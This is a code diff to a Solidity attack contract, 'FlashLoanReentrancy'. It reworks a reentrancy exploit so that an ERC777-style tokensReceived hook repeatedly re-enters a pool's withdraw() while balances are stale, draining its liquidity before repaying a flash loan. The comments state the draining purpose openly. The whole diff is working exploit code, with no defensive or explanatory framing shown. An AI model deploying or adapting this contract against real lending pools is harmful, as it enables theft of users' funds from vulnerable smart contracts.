@@ -18,6 +18,8 @@ contract FlashLoanReentrancy {
     IERC20 public token;
     uint256 public attackCount;
     uint256 public maxAttacks;
+    bool public armed;
+    uint256 public drainAmount;
 
     constructor(address _pool, address _token) {
         pool = IPool(_pool);
@@ -32,18 +34,23 @@ contract FlashLoanReentrancy {
         token.approve(address(pool), amount);
         pool.deposit(address(token), amount);
 
+        armed = true;
+        drainAmount = amount;
         attackCount = 0;
-        maxAttacks = 5;
+        maxAttacks = 4;
         pool.withdraw(address(token), amount); // re-enters via token transfer hook
 
+        armed = false;
         token.transfer(msg.sender, amount); // repay flash loan
     }
 
-    function reenter(address _token, uint256 amount) external {
-        // called by the pool's token hook; drains remaining balance
-        if (attackCount < maxAttacks) {
+    // ERC777-style hook fired on every direct token transfer to this contract.
+    // The vulnerable pool sends tokens BEFORE updating balances, so we re-enter
+    // withdraw() and drain the remaining liquidity while the balance is stale.
+    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external {
+        if (armed && attackCount < maxAttacks) {
             attackCount++;
-            pool.withdraw(_token, amount);
+            pool.withdraw(address(token), drainAmount);
         }
     }
 }
